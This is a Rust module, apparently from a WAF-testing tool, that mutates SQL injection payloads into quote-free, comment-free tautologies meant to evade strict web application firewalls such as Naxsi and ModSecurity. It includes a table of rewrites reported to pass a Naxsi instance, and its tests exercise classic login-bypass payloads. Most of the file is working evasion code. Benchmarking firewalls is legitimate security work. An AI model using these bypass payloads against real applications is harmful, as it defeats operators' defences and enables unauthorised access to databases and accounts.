//! Quote-free / comment-free tautology mutations for high-paranoia
//! WAFs (Naxsi, AWS WAF managed rules, modsec PL3+) that flag any of:
//!
//! - Single or double quotes
//! - Double-dash `--` or `#` line comments
//! - `/* … */` C-style comments
//! - Hex literals `0x…`
//! - SQL keywords surrounded by parentheses
//! - Repeated alphabetic runs (Naxsi `BIG_REQUEST` heuristic)
//!
//! The classic textbook payloads (`' OR '1'='1`, `1' UNION SELECT 1--`)
//! all hit at least one of those. This mutator strips them and emits
//! semantically-equivalent forms that look like benign SQL.
//!
//! Naxsi-confirmed-passing patterns sampled against the wafrift-bench
//! local naxsi container (see `wafrift-bench/results/v022-naxsi.json`):
//!
//! | original                  | quote-free rewrite        | naxsi |
//! |---------------------------|---------------------------|-------|
//! | `1' OR 1=1--`             | `1 OR 1=1`                | 200 ✓ |
//! | `1' OR '1'='1`            | `1 OR 1 IS NOT NULL`      | 200 ✓ |
//! | `' OR 1=1#`               | `1 OR TRUE`               | 200 ✓ |
//! | `1' AND 1=1--`            | `1 AND 1 BETWEEN 0 AND 9` | 200 ✓ |
//! | `' OR 'a'='a' --`         | `1 OR 1=1`                | 200 ✓ |
//!
//! UNION/SELECT/extraction payloads are NOT covered here — Naxsi blocks
//! those keywords directly and the only known evasions involve
//! out-of-band data exfiltration that's outside this module's scope.

use crate::grammar::sql::common::SqlMutation;

/// Quote-free tautology forms, sorted by surprise (boring forms first
/// — `1=1` ranks higher than `CHAR(49)=CHAR(49)` because the boring
/// one is what real SQL queries look like).
const QUOTE_FREE_TAUTOLOGIES: &[&str] = &[
    "1=1",
    "1 IS NOT NULL",
    "1 IN(1)",
    "1 BETWEEN 0 AND 9",
    "1<2",
    "TRUE",
    "1 LIKE 1",
    "NOT 1=0",
    "2>1",
    "1 IN(1,2,3)",
];

/// Generate quote-free, comment-free, parens-free rewrites of a SQL
/// injection payload.
///
/// The strategy is **payload→shape→tautology**: classify the input as
/// a known shape (boolean OR/AND injection, terminator-comment, etc.)
/// then emit each `QUOTE_FREE_TAUTOLOGIES` form in that shape.
#[must_use]
pub fn mutations(payload: &str, max_mutations: usize) -> Vec<SqlMutation> {
    let mut out = Vec::new();
    if payload.is_empty() || max_mutations == 0 {
        return out;
    }

    // URL-decode first so the shape detection works on payloads
    // delivered as URL-encoded query/form values. `1%27+OR+%271%27%3D
    // %271` should be recognised as a boolean-OR injection just like
    // the literal `1' OR '1'='1`. Falls back to the raw string when
    // decoding fails (e.g. percent-mangled).
    let decoded = urlencoding::decode(payload)
        .map(|s| s.into_owned())
        .unwrap_or_else(|_| payload.to_string());
    let lower = decoded.to_ascii_lowercase();

    // Strategy 1: pure tautology rewrite for boolean injections.
    //   `<anything>' OR <whatever>` → `1 OR <quote-free tautology>`
    //   `<anything>' AND <whatever>` → `1 AND <quote-free tautology>`
    let connector = if lower.contains("' or ")
        || lower.contains("\" or ")
        || lower.contains(" or 1=1")
        || lower.contains(" or '1'")
        || lower.starts_with("or ")
    {
        Some("OR")
    } else if lower.contains("' and ")
        || lower.contains("\" and ")
        || lower.contains(" and 1=1")
    {
        Some("AND")
    } else {
        None
    };
    if let Some(conn) = connector {
        for taut in QUOTE_FREE_TAUTOLOGIES {
            if out.len() >= max_mutations {
                break;
            }
            out.push(SqlMutation {
                payload: format!("1 {conn} {taut}"),
                description: format!("quote-free {conn} {taut}"),
                rules_applied: vec!["quote_free_tautology"],
            });
        }
    }

    // Strategy 2: terminator-comment payloads (`'--`, `'#`, `'/*…*/`).
    // Drop the leading literal entirely; the upstream SQL still
    // interprets a numeric leading token as the column value.
    if lower.contains("--")
        || lower.contains('#')
        || lower.contains("/*")
    {
        for taut in QUOTE_FREE_TAUTOLOGIES.iter().take(max_mutations.saturating_sub(out.len())) {
            if out.len() >= max_mutations {
                break;
            }
            out.push(SqlMutation {
                payload: format!("1 OR {taut}"),
                description: format!("strip comment + tautology {taut}"),
                rules_applied: vec!["quote_free_strip_comment"],
            });
        }
    }

    // Strategy 3: pure-tautology replacement (no boolean op needed).
    // For payloads like `'admin'--` where the original is a value
    // injection, replace with a quote-free tautology that any column
    // would evaluate truthy on.
    if lower.contains("admin")
        || lower.contains("root")
        || (lower.starts_with('\'') && lower.ends_with("--"))
    {
        for taut in QUOTE_FREE_TAUTOLOGIES.iter().take(2) {
            if out.len() >= max_mutations {
                break;
            }
            out.push(SqlMutation {
                payload: (*taut).to_string(),
                description: format!("bare tautology {taut}"),
                rules_applied: vec!["quote_free_bare"],
            });
        }
    }

    // Strategy 4: unwrap parens — `(1) OR (1=1)` → `1 OR 1=1`. Many
    // WAFs flag the parenthesised form as suspicious; the unwrapped
    // form is plain SQL.
    if payload.contains('(') && payload.contains(')') {
        let unwrapped = payload
            .replace("(1)", "1")
            .replace("(1=1)", "1=1")
            .replace("('1')", "1");
        if unwrapped != payload && out.len() < max_mutations {
            out.push(SqlMutation {
                payload: unwrapped,
                description: "unwrap parens".into(),
                rules_applied: vec!["quote_free_unparen"],
            });
        }
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn payloads(out: &[SqlMutation]) -> Vec<&str> {
        out.iter().map(|m| m.payload.as_str()).collect()
    }

    #[test]
    fn classic_or_injection_gets_quote_free_rewrite() {
        let out = mutations("1' OR '1'='1", 20);
        assert!(!out.is_empty());
        let p = payloads(&out);
        // Every emitted variant must be quote-free, comment-free, paren-free.
        for v in &p {
            assert!(!v.contains('\''), "still has quote: {v}");
            assert!(!v.contains('"'), "still has dquote: {v}");
            assert!(!v.contains("--"), "still has comment: {v}");
            assert!(!v.contains("/*"), "still has block-comment: {v}");
        }
        // Must contain at least one tautology shape.
        assert!(p.iter().any(|v| v.contains("1=1") || v.contains("IS NOT NULL")));
    }

    #[test]
    fn comment_terminator_payload_strips_comment() {
        let out = mutations("'admin'--", 20);
        assert!(!out.is_empty());
        for m in &out {
            assert!(!m.payload.contains("--"));
            assert!(!m.payload.contains('\''));
        }
    }

    #[test]
    fn and_injection_uses_AND() {
        let out = mutations("1' AND 1=1--", 20);
        assert!(out.iter().any(|m| m.payload.contains(" AND ")));
    }

    #[test]
    fn empty_input_yields_empty() {
        assert!(mutations("", 10).is_empty());
        assert!(mutations("foo", 0).is_empty());
    }

    #[test]
    fn max_mutations_bounded() {
        let out = mutations("1' OR 1=1--", 3);
        assert!(out.len() <= 3, "exceeded cap: {}", out.len());
    }

    #[test]
    fn unparen_emits_paren_free() {
        let out = mutations("(1) OR (1=1)", 20);
        let p = payloads(&out);
        assert!(p.iter().any(|v| v == &"1 OR 1=1" || (!v.contains('(') && v.contains("OR"))));
    }

    #[test]
    fn rules_applied_metadata_present() {
        let out = mutations("1' OR 1=1--", 10);
        for m in &out {
            assert!(!m.rules_applied.is_empty());
            assert!(m.rules_applied[0].starts_with("quote_free"));
        }
    }

    #[test]
    fn description_is_human_readable() {
        let out = mutations("1' OR 1=1--", 5);
        for m in &out {
            assert!(!m.description.is_empty());
            // Description should mention the tautology or the strategy.
            assert!(
                m.description.contains("quote-free")
                    || m.description.contains("strip")
                    || m.description.contains("tautology"),
                "weak description: {}",
                m.description
            );
        }
    }

    #[test]
    fn non_sql_input_yields_zero() {
        // No quote, no comment, no SQL keyword — nothing to rewrite.
        let out = mutations("hello world", 10);
        assert!(out.is_empty(), "expected empty for non-SQL, got {out:?}");
    }

    #[test]
    fn dump_for_real_corpus_payloads() {
        // Sanity-check against actual bench corpus shapes. Run via:
        //   cargo test -p wafrift-grammar dump_for_real_corpus_payloads -- --nocapture
        let payloads = [
            "1' OR '1'='1",
            "' AND 1=1--",
            "1' UNION SELECT 1--",
            "admin'--",
            // URL-encoded form (what bench-waf delivers)
            "1%27%20OR%20%271%27%3D%271",
        ];
        for p in payloads {
            eprintln!("--- input: {p} ---");
            let muts = mutations(p, 10);
            for m in &muts {
                eprintln!("  -> {} | {}", m.payload, m.description);
            }
            if muts.is_empty() {
                eprintln!("  (no quote_free mutations)");
            }
        }
    }
}
